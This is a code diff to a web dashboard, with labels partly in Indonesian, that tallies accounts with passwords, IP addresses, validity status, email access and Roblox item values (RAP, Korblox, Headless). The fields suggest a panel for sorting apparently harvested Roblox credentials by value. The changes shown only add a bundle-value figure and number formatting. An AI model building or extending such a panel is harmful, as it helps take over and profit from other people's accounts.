@@ -215,7 +215,7 @@
       <div class="detail-grid" id="detailGrid">
         <div class="rap-highlight-box">
           <div class="rap-icon-box"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></div>
-          <div><div class="m-label">TOTAL RAP</div><div style="font-size:26px; font-weight:900; color:#fff; margin-top:2px;" id="statTotalRap">0</div></div>
+          <div><div class="m-label">TOTAL RAP</div><div style="font-size:28px; font-weight:900; color:#fff; margin-top:2px;" id="statTotalRap">0</div><div id="statBundleSub" style="font-size:11.5px; color:var(--muted); font-family:monospace; margin-top:4px;">+ nilai bundle 0 (bukan RAP)</div></div>
         </div>
         <div class="metrics-2col">
           <div class="metric-box"><div class="m-icon" style="color:var(--green);">✓</div><div><div class="m-label">VALID</div><div class="m-val" id="statValidDetail" style="color:var(--green);">0</div></div></div>
@@ -225,7 +225,7 @@
           <div class="metric-box"><div class="m-icon" style="color:#fbbf24;">👤</div><div><div class="m-label">HEADLESS</div><div class="m-val" id="statHeadless">0</div></div></div>
           <div class="metric-box"><div class="m-icon" style="color:var(--purple);">🦴</div><div><div class="m-label">KORBLOX</div><div class="m-val" id="statKorblox">0</div></div></div>
           <div class="metric-box"><div class="m-icon" style="color:var(--blue);">💎</div><div><div class="m-label">MALIVINIUS</div><div class="m-val" id="statMalivinius">0</div></div></div>
-          <div class="metric-box"><div class="m-icon" style="color:var(--green);">✉</div><div><div class="m-label">HAS MAIL</div><div class="m-val" id="statHasMail">0</div></div></div>
+          <div class="metric-box" style="grid-column: 1 / -1;"><div class="m-icon" style="color:var(--green);">✉</div><div><div class="m-label">HAS MAIL</div><div class="m-val" id="statHasMail">0</div></div></div>
         </div>
       </div>
     </div>
@@ -339,7 +339,7 @@
           pw: item.pass || "-",
           ip: item.ip || "-",
           country: (item.location || "Unknown").split("(")[0].trim(),
-          rap: Number(item.total_rap || 0),
+          rap: Number(item.total_rap || 0), bundleValue: Number(item.bundle_value || 0),
           avatar: item.avatar_url || DEFAULT_AVATAR,
           hasCustomAvatar: Boolean(item.avatar_url),
           limiteds: limiteds, limitedItems: item.limited_items || limiteds.map(n => ({name: n, rap: 0, is_bundle: false})),
@@ -512,7 +512,10 @@
       document.getElementById('exp-cnt-invalid').innerText = invalidCount;
 
       const totalRap = rawData.reduce((acc, x) => acc + (x.rap || 0), 0);
-      document.getElementById('statTotalRap').innerText = totalRap.toLocaleString();
+      const fmtK = n => n >= 1000 ? (n / 1000).toFixed(1).replace(/\.0$/, "") + "K" : n.toLocaleString();
+      const totalBundleVal = rawData.reduce((acc, x) => acc + (x.bundleValue || 0), 0);
+      document.getElementById('statTotalRap').innerText = fmtK(totalRap);
+      document.getElementById('statBundleSub').innerText = `+ nilai bundle ${fmtK(totalBundleVal)} (bukan RAP)`;
       document.getElementById('statValidDetail').innerText = validCount;
       document.getElementById('statInvalidDetail').innerText = invalidCount;
       document.getElementById('statSecureDetail').innerText = secureCount;
